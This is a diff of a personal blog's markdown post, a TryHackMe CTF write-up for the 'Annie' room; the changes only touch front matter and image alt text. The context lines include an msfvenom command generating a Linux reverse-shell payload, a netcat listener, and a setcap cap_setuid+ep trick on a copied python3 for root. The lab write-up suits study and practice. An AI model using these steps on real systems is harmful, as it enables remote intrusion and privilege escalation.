@@ -1,5 +1,5 @@
 ---
-layout: post
+
 title: Box - Annie
 published: true
 ---
@@ -8,7 +8,7 @@ TryHackMe CTF Box - Remote access comes in different flavors.
 
 [https://tryhackme.com/room/annie](https://tryhackme.com/room/annie)
 
-![](/assets/annie01.jpg)
+![0xskar](/assets/annie01.webp)
 
 * * *
 
@@ -37,7 +37,7 @@ PORT     STATE SERVICE         VERSION
 1. ``msfvenom -p linux/x64/shell_reverse_tcp LHOST=ip LPORT=7777 -b "\x00\x25\x26" -f python -v shellcode``
 2. inset into payload and setup ``nc -nvlp 7777``
 
-![](/assets/annie02.png)
+![0xskar](/assets/annie02.png)
 
 * * * 
 
@@ -63,7 +63,7 @@ Now that we have annie ssh to make things easiar we can login there and continue
 
 setcap allows us to set special permissions on files allowing us to privesc. Is we set cap_setuid+ep into a binary it can lead to privilege escalation. See the process in below pic.
 
-![](/assets/annie04.png)
+![0xskar](/assets/annie04.png)
 
 1. We check permissions on python3 as we can use that to spawn a root shell with SUID
 2. It doesnt have the special permission so we can copy it from its directory to annies and setcap cap_setuid+ep and spawn a shell.
